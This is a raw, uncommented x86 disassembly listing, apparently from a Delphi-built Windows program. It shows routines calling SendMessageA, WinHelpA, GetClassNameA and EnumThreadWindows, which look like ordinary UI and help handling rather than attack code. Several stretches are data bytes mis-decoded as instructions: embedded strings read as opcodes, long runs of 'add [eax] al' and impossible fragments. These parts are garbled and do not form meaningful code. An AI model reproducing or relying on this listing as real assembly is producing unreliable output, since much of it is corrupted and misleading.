sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_4403c0
retn
mov dl 0x2
call sub_4403c0
jmp r-xdata
xor edx edx
call sub_4403c0
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_4403c0
jmp r-xdata
sub_4403c0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_40346c
sub_440414
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43ff2c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_449e0c
mov eax ebx
mov si 0xffc8
call sub_40346c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_44046f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x646d173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
sub_4404b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440546
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45e09c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44c4d8
mov eax ebx
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_40346c
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44054d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_440564
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440589
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440590
retn
sub_440690
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_452f04
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4406cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4406f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4406f8
retn
sub_440704
push 0xf70047b6
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_441067
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4411f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44106e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40400c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_4080ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_44114c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_4080ac
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_40403c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4408b0
mov eax [ ebp - 0x14 ]
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_44079e
inc esp
add [ edi - 0x6effbbf9 ] al
pop es
inc esp
add [ 0x3d004407 ] dh
pop es
inc esp
add [ ebp + 0x7 ] al
inc esp
add [ ebp + 0x7 ] cl
inc esp
add [ ebp + 0x7 ] dl
inc esp
add [ ebp + 0x7 ] bl
xchg [ edi ] eax
inc esp
add [ ecx + 0x35004407 ] dl
pop es
inc esp
add [ 0x45004407 ] bh
pop es
cmp bl [ edi + eax + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
add [ ebp + 0x7 ] ah
inc esp
add [ ebp + 0x7 ] ch
inc esp
add [ ebp + 0x7 ] dh
inc esp
add [ 0x1d004407 ] dl
pop es
inc esp
add [ 0x2d004407 ] ah
pop es
inc esp
add [ 0x3004407 ] cl
pop ebp
pop es
cmp bl [ edi + eax + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub eax 0xd004407
pop es
inc esp
add [ ebx ] al
cmp bl [ edi + eax + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax ] cl
inc esp
add al ah
pop es
inc esp
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
or [ eax + eax + 0x24 ] al
add [ eax ] al
add ah cl
adc [ eax ] eax
mov al [ 0x28004034 ]
pop ecx
inc eax
add [ ecx + ebx * 2 ] dh
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x40 ] al
add [ edx + esi ] ah
inc eax
add [ ebx + edx ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
pushfd
mov [ 0x1c0042 ] eax
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440965
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fe8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404080
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44096c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404368
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4408b0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440965
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fe8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404080
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44096c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404368
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_440980
push ebx
mov ebx eax
mov eax ebx
call sub_440cb0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4058a8
sub_4409bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440a23
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4408b0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440a2a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_440a34
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_440abc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4409a8
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404368
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ac3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
sub_440acf
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440b57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4411f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b5e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4408b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_440adc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440b57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4411f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b5e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4408b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_440b64
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440c5c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4408b0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da8
mov eax ebx
call sub_4411f4
test al al
je r-xdata
mov ecx sub_440704
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c63
lea eax [ ebp - 0x1c ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4408b0
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_44114c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40403c
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_440ccc
push ebx
mov ebx eax
mov eax ebx
call sub_440cb0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4058a8
pop ebx
retn
mov eax rw-data
call sub_4058a8
sub_440cfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_440d54
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440d5b
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4408b0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_440d64
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440e5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408d68
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4408b0
mov eax ebx
call sub_4411f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440e61
lea eax [ ebp - 0x110 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404258
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_44114c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404258
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_440e78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_440eda
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ee1
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4408b0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_440eec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440f6c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4408b0
mov eax ebx
call sub_4411f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f73
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44114c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44107c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087e0
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4410d7
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087bc
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_44114c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404498
xor eax eax
push ebp
push sub_4411c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_441130
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4411c9
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407e3c
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4411d8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4411f4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_441130
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4411d4
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4411d8
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_441250
sub_441250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4412cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_440cb0
call GetTickCount
mov ebx eax
push 0x0
call sub_4063ec
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4408b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4412d4
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4412dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035bc
call sub_4058c0
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_441324
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_441350
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4413be
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4413c5
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4058a8
mov eax rw-data
call sub_4058a8
mov eax rw-data
call sub_4058a8
mov eax rw-data
call sub_403fe8
mov eax rw-data
call sub_4058a8
mov eax [ rw-data ]
call sub_440980
sub_4413c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44141a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441421
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4412dc
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4058a8
mov edx eax
mov eax [ rw-data ]
call sub_42a63c
sub_441424
sub [ esp + eax * 2 ] dl
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
nop
inc esp
adc al 0x44
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add [ eax ] al
adc eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x15
inc esp
add [ eax + eax ] dh
jae r-xdata
inc esp
add [ eax + 0x3d ] al
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi + 0x15 ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x15 ] si
inc esp
add [ ecx + edx ] ch
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax + 0x50004034 ] ah
cmp eax 0x3d400044
inc esp
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax - 0x33ffbbc5 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x340044 ] ah
jb r-xdata
add [ esi + edx + r--data ] dl
inc esp
jb r-xdata
add al dh
cmp al 0x44
add [ eax + 0x6000443d ] dh
cmp eax 0x54160044
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
pop esp
adc al 0x44
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x14 ] bl
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
add [ eax ] ch
inc esp
add ah cl
cmp eax [ eax + eax - 0x7c ]
cmp eax 0x3b900044
inc esp
add [ esi + edi ] dh
inc esp
add al ch
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
pop eax
adc eax 0x34a00044
inc eax
add [ eax + 0x3d ] dl
inc esp
add [ eax + 0x3d ] al
inc esp
add [ esp + esi + 0x34a80040 ] dh
add [ eax ] al
xchg esp eax
push ss
inc esp
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add ah bl
cmp eax 0x3ccc0044
inc esp
add al cl
cmp al 0x44
add ah cl
cmp eax [ eax + eax - 0x7c ]
cmp eax 0x3b900044
inc esp
add ah ah
cmp al 0x44
add al ch
cmp al 0x44
add [ ebx + 0x4415a4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
adc eax 0x3c0044
add [ eax ] al
mov ah 0x14
inc esp
add [ eax + 0x50004034 ] ah
cmp eax 0x3d400044
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc esp
add [ eax + eax * 2 + 0x44 ] dl
inc ebx
outsd
outsb
je r-xdata
cmp al 0x44
add [ esi + edi + 0x44 ] dl
add [ eax + 0x6000443d ] dh
cmp eax 0x54140044
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0xc ] si
push ss
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
pop ss
inc esp
add [ eax ] al
add [ eax ] al
sbb al 0x16
inc esp
add [ eax + 0x50004034 ] ah
cmp eax 0x3e740044
inc esp
